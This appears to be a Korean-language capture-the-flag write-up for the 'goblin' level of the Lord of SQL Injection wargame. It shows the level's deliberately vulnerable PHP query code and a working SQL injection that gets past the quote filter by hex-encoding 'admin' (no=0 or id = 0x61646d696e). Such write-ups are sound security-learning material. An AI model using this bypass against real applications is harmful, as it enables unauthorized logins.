# LOS - goblin

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

문제에서 요구하는 것은 id를 admin으로 바꿔서 login하는 것이다. 

하지만 앞의 문제들과 다르게 quotes를 사용할 수 없어서 no만으로 추측해야 한다. 

일단 or id = admin같은 대입을 시도해보았으나 quotes가 없어서 뚫리지 않았다. 

no에 brute force로 대입해보았으나 1일때 guest를 출력해주는 것 말고는 딱히 뭐가 안보여서  admin이라는 글자를 hex로 인코딩해서 id값으로 넣어주었더니 admin으로 login되었다.

```python
>>> "admin".encode("hex")
'61646d696e'
```

```mysql
query : select id from prob_goblin where id='guest' and no=0 or id = 0x61646d696e
```

![1565238177068](C:\Users\qkrwl\Documents\web\los\LOS - goblin-clear.png)